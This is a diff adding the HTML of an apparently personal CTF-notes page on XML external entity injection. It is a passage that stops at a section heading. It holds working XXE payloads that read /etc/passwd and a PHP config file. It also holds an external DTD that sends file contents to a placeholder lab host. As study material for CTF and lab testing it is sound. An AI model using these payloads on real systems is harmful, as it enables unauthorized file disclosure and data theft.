@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" data-theme="light">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="XML external entity injection Prove XML processing, then entity expansion, then external resource access. Each step establishes a different capability.
+1. Establish the parsing surface Look for XML API bodies, SOAP, SVG, document imports and server-side XML conversions. Keep the application’s real root and field names; changing the entire document may fail schema validation before reaching the interesting parser.
+&lt;?xml version=&#34;1.0&#34;?&gt; &lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;Use the original accepted Content-Type, normally application/xml or text/xml. A JSON route may reject XML completely. Conversion support must be demonstrated, not assumed.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/web-expl/xxe/">
+  <meta property="og:site_name" content="offsec-n0t3">
+  <meta property="og:title" content="XXE & XML Parsers">
+  <meta property="og:description" content="XML external entity injection Prove XML processing, then entity expansion, then external resource access. Each step establishes a different capability.
+1. Establish the parsing surface Look for XML API bodies, SOAP, SVG, document imports and server-side XML conversions. Keep the application’s real root and field names; changing the entire document may fail schema validation before reaching the interesting parser.
+&lt;?xml version=&#34;1.0&#34;?&gt; &lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;Use the original accepted Content-Type, normally application/xml or text/xml. A JSON route may reject XML completely. Conversion support must be demonstrated, not assumed.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="XXE & XML Parsers">
+  <meta itemprop="description" content="XML external entity injection Prove XML processing, then entity expansion, then external resource access. Each step establishes a different capability.
+1. Establish the parsing surface Look for XML API bodies, SOAP, SVG, document imports and server-side XML conversions. Keep the application’s real root and field names; changing the entire document may fail schema validation before reaching the interesting parser.
+&lt;?xml version=&#34;1.0&#34;?&gt; &lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;Use the original accepted Content-Type, normally application/xml or text/xml. A JSON route may reject XML completely. Conversion support must be demonstrated, not assumed.">
+  <meta itemprop="wordCount" content="605">
+
+<title>XXE &amp; XML Parsers • offsec-n0t3</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/web-expl/xxe/">
+<link rel="stylesheet" href="/book.min.7886b6a45be989e541bea3447ffdf8cfa4eab5872c00b33d9895c3fe20798996.css" integrity="sha256-eIa2pFvpieVBvqNEf/34z6TqtYcsALM9mJXD/iB5iZY=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.6641e65073282cb36eef05cedef40c45da2ae0b4450909d47bde09f2d8432c67.js" integrity="sha256-ZkHmUHMoLLNu7wXO3vQMRdoq4LRFCQnUe94J8thDLGc=" crossorigin="anonymous"></script>
+  <meta name="theme-color" content="#252637">
+
+<script defer src="/fieldbook.min.04e65c4f438e6e13ced1f07c11e88ce2991776fff8f8dab5afe6834a7cd40d67.js" integrity="sha256-BOZcT0OObhPO0fB8EeiM4pkXdv/4&#43;Nq1r&#43;aDSnzUDWc="></script>
+<link rel="icon" href="/images/fieldmark.svg" type="image/svg+xml">
+
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<a class="field-brand" href="/" aria-label="offsec-n0t3 home">
+  <span class="brand-sigil" aria-hidden="true">忍</span>
+  <span><strong>offsec<span class="brand-accent">-n0t3</span></strong><small>CTF NOTES / OPEN BOOK</small></span>
+</a>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+<div class="nav-caption">FIELD DIRECTORY <span aria-hidden="true">↙</span></div>
+<a class="directory-home" href="/docs/">⌂ &nbsp; All fieldnotes</a>
+
+
+
+
+
+
+<ul class="field-tree">
+  
+  
+  <li class="field-tree-section" data-collection="web">
+    <details open>
+      <summary><span>Web Exploitation</span><span class="tree-count">32</span></summary>
+      <ul><li><a href="/docs/web-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/web-expl/methodology/" class="" >00 · First 10 Minutes</a></li>
+
+<li><a href="/docs/web-expl/sqli/" class="" >01 · SQLi — Start Here</a></li>
+
+<li><a href="/docs/web-expl/sqli-mysql/" class="" >02 · SQLi — MySQL / MariaDB</a></li>
+
+<li><a href="/docs/web-expl/sqli-postgresql/" class="" >03 · SQLi — PostgreSQL</a></li>
+
+<li><a href="/docs/web-expl/sqli-sqlite/" class="" >04 · SQLi — SQLite</a></li>
+
+<li><a href="/docs/web-expl/sqli-mssql/" class="" >05 · SQLi — SQL Server</a></li>
+
+<li><a href="/docs/web-expl/sqli-oracle/" class="" >06 · SQLi — Oracle</a></li>
+
+<li><a href="/docs/web-expl/sqli-blind/" class="" >07 · SQLi — Blind / Error</a></li>
+
+<li><a href="/docs/web-expl/source-disclosure/" class="" >08 · Source / Backup Leaks</a></li>
+
+<li><a href="/docs/web-expl/ssti/" class="" >SSTI · Identify the Engine First</a></li>
+
+<li><a href="/docs/web-expl/nosqli/" class="" >NoSQL Injection · Operators &amp; Blind Reads</a></li>
+
+<li><a href="/docs/web-expl/xss/" class="" >XSS · Context Before Payload</a></li>
+
+<li><a href="/docs/web-expl/auth-idor/" class="" >Auth &amp; IDOR · Compare Two Accounts</a></li>
+
+<li><a href="/docs/web-expl/jwt/" class="" >JWT · Claims, Algorithms &amp; Keys</a></li>
+
+<li><a href="/docs/web-expl/oauth/" class="" >OAuth / Account Linking</a></li>
+
+<li><a href="/docs/web-expl/prototype-pollution/" class="" >Prototype Pollution · Source to Gadget</a></li>
+
+<li><a href="/docs/web-expl/graphql/" class="" >GraphQL · Schema to Resolver</a></li>
+
+<li><a href="/docs/web-expl/csrf-cors/" class="" >CSRF &amp; CORS · Send vs Read</a></li>
+
+<li><a href="/docs/web-expl/websockets/" class="" >WebSockets / Live Sessions</a></li>
+
+<li><a href="/docs/web-expl/command-injection/" class="" >Command Injection</a></li>
+
+<li><a href="/docs/web-expl/lfi-traversal/" class="" >Traversal &amp; LFI</a></li>
+
+<li><a href="/docs/web-expl/ssrf/" class="" >SSRF</a></li>
+
+<li><a href="/docs/web-expl/xxe/" class="active" aria-current="page">XXE &amp; XML Parsers</a></li>
+
+<li><a href="/docs/web-expl/file-upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/web-expl/deserialization/" class="" >Deserialization</a></li>
+
+<li><a href="/docs/web-expl/business-logic/" class="" >Business Logic &amp; Races</a></li>
+
+<li><a href="/docs/web-expl/http-cache/" class="" >HTTP, Cache &amp; Smuggling</a></li>
+
+<li><a href="/docs/web-expl/php-quirks/" class="" >PHP · Types / Hashes / Parsers</a></li>
+
+<li><a href="/docs/web-expl/ldap-xpath/" class="" >LDAP / XPath Injection</a></li>
+
+<li><a href="/docs/web-expl/open-redirect/" class="" >Open Redirect / URL Parsing</a></li>
+
+<li><a href="/docs/web-expl/encoding-filters/" class="" >Encoding &amp; Filter Bypasses</a></li>
+
+<li><a href="/docs/web-expl/python-snippets/" class="" >Python · Reusable Web Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="network">
+    <details >
+      <summary><span>Network Exploitation</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/network-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/network-expl/packet-triage/" class="" >01 · Packet Triage</a></li>
+
+<li><a href="/docs/network-expl/http-streams/" class="" >02 · HTTP / File Streams</a></li>
+
+<li><a href="/docs/network-expl/dns/" class="" >03 · DNS / Encoded Labels</a></li>
+
+<li><a href="/docs/network-expl/tls-ssh/" class="" >04 · TLS / SSH</a></li>
+
+<li><a href="/docs/network-expl/tcp-udp/" class="" >05 · TCP / UDP Sessions</a></li>
+
+<li><a href="/docs/network-expl/wifi/" class="" >06 · Wi-Fi Capture Analysis</a></li>
+
+<li><a href="/docs/network-expl/can-bus/" class="" >07 · CAN / Cannelloni</a></li>
+
+<li><a href="/docs/network-expl/protocols/" class="" >08 · FTP / Mail / ICMP / SMB</a></li>
+
+<li><a href="/docs/network-expl/python-snippets/" class="" >09 · Python / Ready Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="stego">
+    <details >
+      <summary><span>Steganography</span><span class="tree-count">8</span></summary>
+      <ul><li><a href="/docs/steganograph-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/steganograph-expl/triage/" class="" >First 10 Minutes</a></li>
+
+<li><a href="/docs/steganograph-expl/images-lsb/" class="" >Images: LSB &amp; Bit Planes</a></li>
+
+<li><a href="/docs/steganograph-expl/png-jpeg/" class="" >PNG &amp; JPEG Structure</a></li>
+
+<li><a href="/docs/steganograph-expl/archives-carving/" class="" >Archives &amp; File Carving</a></li>
+
+<li><a href="/docs/steganograph-expl/audio/" class="" >Audio: Samples &amp; Spectrograms</a></li>
+
+<li><a href="/docs/steganograph-expl/pdf-documents/" class="" >PDF &amp; Office Documents</a></li>
+
+<li><a href="/docs/steganograph-expl/text-unicode/" class="" >Text, Whitespace &amp; Unicode</a></li>
+
+<li><a href="/docs/steganograph-expl/python-snippets/" class="" >Offline Python Toolkit</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="reversing">
+    <details >
+      <summary><span>Reverse Engineering</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/reversing-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/reversing-expl/triage/" class="" >Triage · First Five Minutes</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-cheatsheet/" class="" >Ghidra Cheatsheet · From Strings to Check</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-plugins/" class="" >Ghidra Plugins · Built-ins &amp; Offline Extras</a></li>
+
+<li><a href="/docs/reversing-expl/static-analysis/" class="" >Static Analysis · Bytes, Types &amp; Control Flow</a></li>
+
+<li><a href="/docs/reversing-expl/dynamic-debugging/" class="" >Dynamic Debugging · Break, Inspect, Dump</a></li>
+
+<li><a href="/docs/reversing-expl/strings-encodings/" class="" >Strings &amp; Encodings · Preserve the Bytes</a></li>
+
+<li><a href="/docs/reversing-expl/crypto-obfuscation/" class="" >Crypto &amp; Obfuscation · Identify, Model, Verify</a></li>
+
+<li><a href="/docs/reversing-expl/dotnet/" class="" >.NET · dnSpyEx, Resources &amp; IL</a></li>
+
+<li><a href="/docs/reversing-expl/python-snippets/" class="" >Python Snippets · Byte Workbench &amp; Check Models</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="tools">
+    <details >
+      <summary><span>Tools · Visual Cheatsheets</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/tools-cheatsheet/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/tools-cheatsheet/cyberchef-cheatsheet/" class="" >CyberChef · Visual Recipes</a></li>
+
+<li><a href="/docs/tools-cheatsheet/approved-tools-map/" class="" >39 Tools · Technique Map</a></li>
+
+<li><a href="/docs/tools-cheatsheet/python-library/" class="" >Python · Offline Snippet Library</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li><a href="/docs/cli_cheatsheet/" class="">CLI Cheatsheet</a></li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="pico">
+    <details >
+      <summary><span>picoCTF</span><span class="tree-count">4</span></summary>
+      <ul><li><a href="/docs/picoctf/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><details ><summary>Rev</summary><ul><li><a href="/docs/picoctf/rev/">Overview ↗</a></li>
+
+</ul></details></li>
+
+<li><details ><summary>Web</summary><ul><li><a href="/docs/picoctf/web/">Overview ↗</a></li>
+
+<li><a href="/docs/picoctf/web/file_upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/picoctf/web/ip_bypassing/" class="" >Proxy Mnipu</a></li>
+
+<li><a href="/docs/picoctf/web/sqli/" class="" >Sqli</a></li>
+
+<li><a href="/docs/picoctf/web/eval_ssti/" class="" >SSTI</a></li>
+
+</ul></details></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="scripts">
+    <details >
+      <summary><span>Scripts</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/scripts/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/scripts/brute_force_py/" class="" >Brute Force Py</a></li>
+
+<li><a href="/docs/scripts/craft_img_py/" class="" >Craft Img Py</a></li>
+
+<li><a href="/docs/scripts/lro_rlo_fileext/" class="" >Lro Rlo File Ext</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="windows">
+    <details >
+      <summary><span>Windows Rev</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/windows_rev/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/windows_rev/arc4_decrypt/" class="" >Arc4 Decrypt</a></li>
+
+<li><a href="/docs/windows_rev/dmp_hunt4c2/" class="" >Dmp Hunt4c2</a></li>
+
+<li><a href="/docs/windows_rev/x64dbg_cheatsheet/" class="" >X64dbg Cheatsheet</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="approved">
+    <details >
+      <summary><span>AJCBBC Allowed Tools</span><span class="tree-count">39</span></summary>
+      <ul><li><a href="/docs/ajcbbc_allow_tools/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/ajcbbc_allow_tools/cyberchef/" class="" >CyberChef</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wireshark/" class="" >Wireshark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdf_viewer/" class="" >PDF Viewer</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openvpn_client/" class="" >OpenVPN Client</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/google_chrome/" class="" >Google Chrome</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wsl/" class="" >Windows Subsystem for Linux (WSL)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/python3/" class="" >Python 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/uv/" class="" >uv</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/gdb/" class="" >gdb</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/objdump/" class="" >objdump</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/strings/" class="" >strings</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zsteg/" class="" >zsteg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/binwalk/" class="" >binwalk</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/exiftool/" class="" >ExifTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdftotext/" class="" >pdftotext (Poppler utils)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/can_utils/" class="" >can-utils</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/cannelloni/" class="" >cannelloni</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zeek/" class="" >Zeek</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zbar/" class="" >ZBar</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/burp_suite_community/" class="" >Burp Suite Community Edition</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/jq/" class="" >jq</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/ghidra/" class="" >Ghidra</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/sleuth_kit/" class="" >The Sleuth Kit</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssl/" class="" >OpenSSL</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xz/" class="" >xz</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/qpdf/" class="" >qpdf</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/llvm_mc/" class="" >llvm-mc (LLVM tools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xxd/" class="" >xxd</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/fsck_fat/" class="" >fsck.fat (dosfstools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/rsactftool/" class="" >RsaCtfTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/volatility3/" class="" >Volatility 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssh_session_key_recovery/" class="" >OpenSSH-Session-Key-Recovery</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/x64dbg/" class="" >x64dbg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/autopsy/" class="" >Autopsy</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/hxd/" class="" >HxD</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/tshark/" class="" >TShark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/notepad_plus_plus/" class="" >Notepad&#43;&#43;</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/dnspyex/" class="" >dnSpyEx (dnSpy)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/eric_zimmerman_tools/" class="" >Eric Zimmerman&#39;s Tools</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+</ul>
+
+
+
+
+
+
+
+<div class="nav-footer"><span class="status-dot" aria-hidden="true"></span> OFFLINE / PERSONAL NOTES<br><span>Payloads · methods · worked examples</span></div>
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>XXE &amp; XML Parsers</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-establish-the-parsing-surface">1. Establish the parsing surface</a></li>
+    <li><a href="#2-internal-entity-probe">2. Internal entity probe</a></li>
+    <li><a href="#3-local-file-entity">3. Local file entity</a></li>
+    <li><a href="#4-blind-external-entity-callback">4. Blind external entity callback</a></li>
+    <li><a href="#5-external-dtd-file-extraction-in-a-matching-lab">5. External DTD file extraction in a matching lab</a></li>
+    <li><a href="#6-xinclude-cannot-control-a-doctype">6. XInclude: cannot control a DOCTYPE</a></li>
+    <li><a href="#7-svg-and-document-uploads">7. SVG and document uploads</a></li>
+    <li><a href="#troubleshooting">Troubleshooting</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      <div id="field-content" tabindex="-1"></div>
+
+<div class="page-topline" data-collection="web"><nav aria-label="Breadcrumb"><a href="/docs/">NOTEBOOK</a><span>/</span><a href="/docs/web-expl/">Web Exploitation</a></nav><span>3 MIN READ</span></div>
+
+
+
+      
+  <article class="markdown book-article"><h1 id="xml-external-entity-injection">XML external entity injection<a class="anchor" href="#xml-external-entity-injection"></a></h1>
+<p><strong>Prove XML processing, then entity expansion, then external resource access.</strong> Each step establishes a different capability.</p>
+<h2 id="1-establish-the-parsing-surface">1. Establish the parsing surface<a class="anchor" href="#1-establish-the-parsing-surface"></a></h2>
+<p>Look for XML API bodies, SOAP, SVG, document imports and server-side XML conversions. Keep the application&rsquo;s real root and field names; changing the entire document may fail schema validation before reaching the interesting parser.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">&lt;stockCheck&gt;&lt;productId&gt;</span>1<span style="color:#81a1c1">&lt;/productId&gt;&lt;storeId&gt;</span>1<span style="color:#81a1c1">&lt;/storeId&gt;&lt;/stockCheck&gt;</span></span></span></code></pre></div><p>Use the original accepted <code>Content-Type</code>, normally <code>application/xml</code> or <code>text/xml</code>. A JSON route may reject XML completely. Conversion support must be demonstrated, not assumed.</p>
+<h2 id="2-internal-entity-probe">2. Internal entity probe<a class="anchor" href="#2-internal-entity-probe"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;!DOCTYPE stockCheck [
+</span></span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">  &lt;!ENTITY marker &#34;CTF_XML_71&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">&lt;stockCheck&gt;&lt;productId&gt;</span><span style="color:#d08770">&amp;marker;</span><span style="color:#81a1c1">&lt;/productId&gt;&lt;storeId&gt;</span>1<span style="color:#81a1c1">&lt;/storeId&gt;&lt;/stockCheck&gt;</span></span></span></code></pre></div><p>Control: change the entity value to <code>CTF_XML_82</code>. Expanded markers in a field-validation error establish internal entity processing. An unchanged <code>&amp;marker;</code>, escaped output or a generic error does not.</p>
+<p>Internal entities working <strong>does not prove external entities are enabled</strong>.</p>
+<h2 id="3-local-file-entity">3. Local file entity<a class="anchor" href="#3-local-file-entity"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;!DOCTYPE stockCheck [
+</span></span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">  &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">&lt;stockCheck&gt;&lt;productId&gt;</span><span style="color:#d08770">&amp;xxe;</span><span style="color:#81a1c1">&lt;/productId&gt;&lt;storeId&gt;</span>1<span style="color:#81a1c1">&lt;/storeId&gt;&lt;/stockCheck&gt;</span></span></span></code></pre></div><p>Compare <code>file:///etc/ctf-does-not-exist</code>. Recognizable file bytes vs a read failure are evidence. Then read known application source or the actual challenge path using the same primitive.</p>
+<p>Potential complications: numeric conversion before reflection, newlines in the response, illegal XML characters inside the target file, restricted file permissions, or a parser configured to load no external resources.</p>
+<p>For a confirmed PHP stream-capable XML loader, a Base64 filter can encode difficult file bytes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;!ENTITY xxe SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/var/www/html/config.php&#34;&gt;</span></span></span></code></pre></div><p>This is PHP-specific; Java and Python XML parsers do not implement PHP wrappers.</p>
+<h2 id="4-blind-external-entity-callback">4. Blind external entity callback<a class="anchor" href="#4-blind-external-entity-callback"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;!DOCTYPE stockCheck [
+</span></span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">  &lt;!ENTITY xxe SYSTEM &#34;http://YOUR-LAB-HOST/xxe-general-71&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">&lt;stockCheck&gt;&lt;productId&gt;</span><span style="color:#d08770">&amp;xxe;</span><span style="color:#81a1c1">&lt;/productId&gt;&lt;storeId&gt;</span>1<span style="color:#81a1c1">&lt;/storeId&gt;&lt;/stockCheck&gt;</span></span></span></code></pre></div><p>If general entity processing is blocked but external parameter entities are allowed, test a unique marker:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;!DOCTYPE stockCheck [
+</span></span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">  &lt;!ENTITY % remote SYSTEM &#34;http://YOUR-LAB-HOST/xxe-parameter-71&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>  %remote;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">&lt;stockCheck&gt;&lt;productId&gt;</span>1<span style="color:#81a1c1">&lt;/productId&gt;&lt;storeId&gt;</span>1<span style="color:#81a1c1">&lt;/storeId&gt;&lt;/stockCheck&gt;</span></span></span></code></pre></div><p>Serve valid DTD content, such as an empty response, if the callback is fetched. Compare a normal XML control and fresh callback IDs. A callback establishes resource resolution; it does not automatically disclose file contents. See <a href="https://portswigger.net/web-security/xxe/blind">blind XXE prerequisites</a>.</p>
+<h2 id="5-external-dtd-file-extraction-in-a-matching-lab">5. External DTD file extraction in a matching lab<a class="anchor" href="#5-external-dtd-file-extraction-in-a-matching-lab"></a></h2>
+<p>If the challenge permits serving your own DTD, the submitted document can load it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;!DOCTYPE stockCheck [
+</span></span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">  &lt;!ENTITY % remote SYSTEM &#34;http://YOUR-LAB-HOST/extract.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>  %remote;
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1">&lt;stockCheck&gt;&lt;productId&gt;</span>1<span style="color:#81a1c1">&lt;/productId&gt;&lt;storeId&gt;</span>1<span style="color:#81a1c1">&lt;/storeId&gt;&lt;/stockCheck&gt;</span></span></span></code></pre></div><p>Contents of <code>extract.dtd</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;!ENTITY % file SYSTEM &#34;file:///flag.txt&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://YOUR-LAB-HOST/collect?data=%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span style="display:flex;"><span>%eval;
+</span></span><span style="display:flex;"><span>%send;</span></span></code></pre></div><p>This depends on external DTD/parameter entity expansion and outbound HTTP. Raw file bytes must fit a URI: spaces, newlines, <code>&amp;</code>, <code>#</code> and binary data commonly break this approach. It is not an arbitrary-file universal extractor. Base64 needs a supported encoding primitive; XML entity expansion does not URL-encode data for you.</p>
+<h2 id="6-xinclude-cannot-control-a-doctype">6. XInclude: cannot control a DOCTYPE<a class="anchor" href="#6-xinclude-cannot-control-a-doctype"></a></h2>
